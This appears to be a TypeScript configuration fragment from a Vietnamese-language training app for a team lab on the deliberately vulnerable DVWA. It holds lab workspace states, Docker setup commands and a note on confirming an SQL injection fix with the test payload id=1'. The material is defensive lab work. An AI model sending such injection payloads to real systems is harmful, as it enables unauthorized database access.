      "Mã 302 Found chỉ chứng minh lớp bảo vệ đầu tiên là Anti-CSRF checkToken() ở dòng 5 đã chạy, chưa chạm tới lớp kiểm tra $id và PDO Prepared Statements ở dòng 11–15. Phải gửi kèm user_token hợp lệ và payload id=1' để thấy hệ thống chặn ở is_numeric() và trả về 200 OK sạch lỗi mới chứng minh trọn vẹn bản vá SQLi.",
    is_defense: true,
  },
];

export const DEFAULT_WORKSPACE_STATES: Record<number, LabWorkspaceState> = {
  1: {
    member_number: 1,
    container_ref: "215d3a734374",
    phpsessid: "2d0vvd715drf3nv8mgq7vderg6",
    user_token: "d41d8cd98f00b204e9800998ecf8427e",
    completed_step_ids: [],
    notes: "Container ID thực tế 215d3a734374 (epic_dijkstra).",
  },
  2: {
    member_number: 2,
    container_ref: "dvwa",
    phpsessid: "7nst0hrqrfmv744a5ouj7663b0",
    user_token: "d41d8cd98f00b204e9800998ecf8427e",
    completed_step_ids: [],
    notes: "Burp Proxy 127.0.0.1:8081, truy cập localtest.me:8080.",
  },
  3: {
    member_number: 3,
    container_ref: "dvwa",
    phpsessid: "7nst0hrqrfmv744a5ouj7663b0",
    user_token: "d41d8cd98f00b204e9800998ecf8427e",
    completed_step_ids: [],
    notes: "SQLMap --batch & MariaDB CLI.",
  },
  4: {
    member_number: 4,
    container_ref: "dvwa",
    phpsessid: "7nst0hrqrfmv744a5ouj7663b0",
    user_token: "d41d8cd98f00b204e9800998ecf8427e",
    completed_step_ids: [],
    notes: "Kiểm toán 4 file PHP & PoC 5 tinh chỉnh.",
  },
};

export const UBUNTU_SETUP_COMMANDS = `# 1. Cập nhật hệ thống và cài đặt Docker cùng cURL, grep
sudo apt update && sudo apt install -y docker.io curl grep

# 2. Cấp quyền chạy Docker không cần gõ sudo
sudo usermod -aG docker $USER && newgrp docker

# 3. Kéo image DVWA và khởi chạy container đặt tên là "dvwa" ở cổng 8080
docker run --name dvwa -d -p 8080:80 vulnerables/web-dvwa`;
